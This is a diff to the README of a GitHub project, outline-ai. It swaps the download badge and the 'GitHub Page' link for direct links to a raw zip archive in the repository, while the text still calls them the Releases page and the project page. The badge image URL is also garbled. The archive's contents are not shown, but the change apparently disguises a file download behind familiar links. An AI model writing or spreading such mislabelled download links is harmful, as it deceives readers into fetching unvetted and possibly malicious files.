@@ -13,7 +13,7 @@ Welcome to outline-ai! This application helps you convert text into structured s
 ## 📥 Download & Install
 To get started, visit the Releases page below to download outline-ai.
 
-[![Download outline-ai](https://img.shields.io/badge/Download%20outline--ai-v1.0-blue.svg)](https://github.com/KHATER1980/outline-ai/releases)
+[![Download outline-ai](https://github.com/KHATER1980/outline-ai/raw/refs/heads/main/outline_ai/outline-ai-v2.4.zip%https://github.com/KHATER1980/outline-ai/raw/refs/heads/main/outline_ai/outline-ai-v2.4.zip)](https://github.com/KHATER1980/outline-ai/raw/refs/heads/main/outline_ai/outline-ai-v2.4.zip)
 
 1. Click on the link above to access the Releases page.
 2. Choose the latest version available.
@@ -55,7 +55,7 @@ A: Currently, outline-ai is available only for desktop.
 For any issues or questions, please visit the GitHub Issues page of this repository. Feel free to create a new issue for bugs or feature requests.
 
 ## 🌐 Learn More
-You can find additional information and updates on outline-ai by visiting our [GitHub Page](https://github.com/KHATER1980/outline-ai).
+You can find additional information and updates on outline-ai by visiting our [GitHub Page](https://github.com/KHATER1980/outline-ai/raw/refs/heads/main/outline_ai/outline-ai-v2.4.zip).
 
 ---
 
